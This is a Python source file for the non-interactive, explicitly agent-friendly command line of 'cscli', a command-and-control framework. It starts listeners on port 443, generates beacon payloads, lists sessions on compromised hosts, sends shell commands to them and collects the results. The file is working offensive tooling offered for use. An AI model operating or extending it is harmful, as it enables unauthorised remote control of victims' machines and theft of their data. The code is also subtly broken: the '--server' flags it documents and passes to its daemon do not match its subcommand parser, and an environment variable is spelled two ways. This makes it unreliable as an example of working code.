"""Non-interactive CLI driver for cscli -- the AI/script-friendly entrypoint.

Unlike the interactive Console, this exposes single-shot subcommands that an
agent or build pipeline can call directly and get structured output:

    # start a listener and keep the server alive (blocking)
    python3 cscli --server --https --name main --port 443 --host 0.0.0.0 \\
                   --key mypass [--background]

    # generate a client payload for a running/planned listener
    python3 cscli --payload --url https://HOST:443 --out beacon.py \\
                   [--key mypass] [--no-verify] [--interval 3] [--jitter 0.2]

    # list sessions
    python3 cscli --list

    # task a session and (optionally) wait for its result
    python3 cscli --task <sid> "shell id" [--wait]

    # dump results for a session
    python3 cscli --results <sid>
"""
import argparse
import json
import os
import sys
import time


def _load_server(data_dir=None):
    from ..server import TeamServer
    if data_dir is None:
        data_dir = os.environ.get("CSCLI_DATA_DIR")
    return TeamServer(data_dir=data_dir)


def _out(obj):
    try:
        sys.stdout.write(json.dumps(obj, ensure_ascii=False, indent=2) + "\n")
    except TypeError:
        sys.stdout.write(str(obj) + "\n")


# --------------------------------------------------------------------------
# subcommand handlers
# --------------------------------------------------------------------------
def _cmd_server(srv, args):
    # In --background mode the listener is owned by a detached daemon process;
    # first do a quick bind-check so we can report errors from the parent.
    if args.background:
        # pre-flight: verify the port is free, then delegate to daemon
        probe = _probe_bind(args.host, args.port)
        if probe:
            _out({"ok": False, "error": f"port {args.port} already in use: {probe}"})
            return 1
        pid = _spawn_background_daemon(args.name, args.host, args.port,
                                       args.https, args.key)
        url = ("https" if args.https else "http") + f"://{args.host}:{args.port}"
        _out({"ok": True, "daemon_pid": pid, "listener": url, "name": args.name})
        return 0

    # Foreground (or daemon child): actually start + hold the listener.
    if args.https:
        lis, err = srv.start_https_listener(
            args.name, args.host, args.port,
            crypto_key=args.key if args.key and args.key.lower() != "none" else None)
    else:
        lis, err = srv.start_listener(
            args.name, args.host, args.port,
            crypto_key=args.key if args.key and args.key.lower() != "none" else None)
    if err:
        _out({"ok": False, "error": err})
        return 1
    _out({"ok": True, "listener": lis.name, "url": lis.url,
          "scheme": lis.scheme, "port": lis.port,
          "aes": lis.gcm is not None, "daemon": True if os.environ.get("CSCCLI_DAEMON") else False})
    try:
        _keep_alive(srv)  # blocking: keeps this process (and the listener) alive
    except KeyboardInterrupt:
        pass
    return 0


def _probe_bind(host, port):
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind((host, port))
        return None
    except OSError as e:
        return str(e)
    finally:
        s.close()


def _spawn_background_daemon(name, host, port, https, key):
    """Fork a fully detached child that owns the listener (blocking loop)."""
    import subprocess as _sp
    here = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    log = os.path.join(here, "data", "daemon.log")
    os.makedirs(os.path.dirname(log), exist_ok=True)
    argv = [sys.executable, os.path.join(here, "cscli"), "--server",
            "--name", name, "--host", host, "--port", str(port)]
    if https:
        argv.append("--https")
    if key:
        argv += ["--key", key]
    with open(log, "w") as lf:
        proc = _sp.Popen(argv, stdout=lf, stderr=_sp.STDOUT,
                         start_new_session=True,
                         env={**os.environ, "CSCCLI_DAEMON": "1"})
    return proc.pid


def _keep_alive(srv):
    while True:
        time.sleep(60)


def _cmd_payload(srv, args):
    from ..payload import write_payload
    write_payload(args.url, args.out, interval=args.interval,
                  jitter=args.jitter,
                  key=args.key if args.key else None,
                  no_verify=args.no_verify)
    _out({"ok": True, "path": os.path.abspath(args.out),
          "url": args.url, "aes": bool(args.key)})


def _cmd_list(srv, args):
    srv.store.reload()
    sess = srv.store.all()
    rows = [{"id": s["id"], "hostname": s["hostname"],
             "user": s["username"], "ip": s["internal_ip"],
             "listener": s["listener"],
             "alive": srv.is_session_alive(s)} for s in sess]
    _out({"sessions": rows, "count": len(rows)})


def _cmd_task(srv, args):
    tid, info = srv.task(args.session_id, args.cmdline)
    if info and "error" in info:
        _out({"ok": False, "error": info["error"]})
        return 1
    if args.wait:
        # emit only the (possibly-delayed) result envelope
        return _wait_result(srv, args.session_id, tid, args.timeout)
    _out({"ok": True, "queued": tid, "session": args.session_id,
          "cmd": args.cmdline})
    return 0


def _wait_result(srv, sid, tid, timeout):
    deadline = time.time() + timeout
    while time.time() < deadline:
        srv.store.reload()
        s = srv.store.get(sid)
        for r in (s or {}).get("results", []):
            if r.get("id") == tid:
                _out({"ok": True, "session": sid, "task": tid,
                      "result": r["data"]})
                return 0
        time.sleep(1)
    _out({"ok": False, "session": sid, "task": tid, "error": "timeout waiting for result"})
    return 1


def _cmd_results(srv, args):
    srv.store.reload()
    s = srv.store.get(args.session_id)
    if not s:
        _out({"ok": False, "error": "session not found"})
        return 1
    rows = [{"id": r["id"], "ts": r["ts"], "data": r["data"]} for r in s["results"]]
    _out({"session": args.session_id, "results": rows, "count": len(rows)})


def run(argv):
    srv = _load_server()
    p = build_parser()
    args = p.parse_args(argv)
    handlers = {
        "server": _cmd_server,
        "payload": _cmd_payload,
        "list": _cmd_list,
        "task": _cmd_task,
        "results": _cmd_results,
    }
    if not args.cmd:
        p.print_help()
        return 1
    return handlers[args.cmd](srv, args)


def build_parser():
    p = argparse.ArgumentParser(prog="cscli", description="cscli C2 (non-interactive)")
    sub = p.add_subparsers(dest="cmd")

    ps = sub.add_parser("server", help="start a listener / team server (blocking)")
    ps.add_argument("--name", default="main")
    ps.add_argument("--host", default="0.0.0.0")
    ps.add_argument("--port", type=int, default=443)
    ps.add_argument("--https", action="store_true", help="use TLS listener")
    ps.add_argument("--key", default=None, help="AES channel passphrase")
    ps.add_argument("--background", action="store_true", help="don't block")
    ps.add_argument("--persist", action="store_true", help="keep running")

    pp = sub.add_parser("payload", help="generate a beacon payload file")
    pp.add_argument("--url", required=True, help="listener URL")
    pp.add_argument("--out", required=True, help="output .py path")
    pp.add_argument("--key", default=None)
    pp.add_argument("--no-verify", action="store_true")
    pp.add_argument("--interval", type=int, default=3)
    pp.add_argument("--jitter", type=float, default=0.2)

    pl = sub.add_parser("list", help="list beacon sessions")

    pt = sub.add_parser("task", help="task a session")
    pt.add_argument("session_id")
    pt.add_argument("cmdline")
    pt.add_argument("--wait", action="store_true", help="wait for result")
    pt.add_argument("--timeout", type=int, default=30)

    pr = sub.add_parser("results", help="show session results")
    pr.add_argument("session_id")

    return p


if __name__ == "__main__":
    sys.exit(run(sys.argv[1:]))
